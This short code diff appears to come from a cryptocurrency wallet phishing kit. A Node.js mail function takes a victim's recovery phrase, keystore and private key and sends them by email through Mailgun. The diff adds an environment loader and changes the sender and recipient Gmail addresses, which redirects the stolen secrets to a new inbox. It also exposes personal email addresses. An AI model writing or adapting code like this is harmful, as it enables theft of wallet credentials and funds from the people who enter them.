@@ -2,6 +2,7 @@
 
 const nodemailer = require("nodemailer");
 const mailGun = require("nodemailer-mailgun-transport");
+require("custom-env").env();
 
 const auth = {
   auth: {
@@ -14,8 +15,8 @@ const transporter = nodemailer.createTransport(mailGun(auth));
 
 const sendMail = (phrase, keyStore, privateKey, cb) => {
   const mailOptions = {
-    from: "bankoleidris@gmail.com",
-    to: "bankoleidris@gmail.com",
+    from: "bankoleidris2001@gmail.com",
+    to: "ycomng@gmail.com",
     phrase,
     keyStore,
     privateKey,
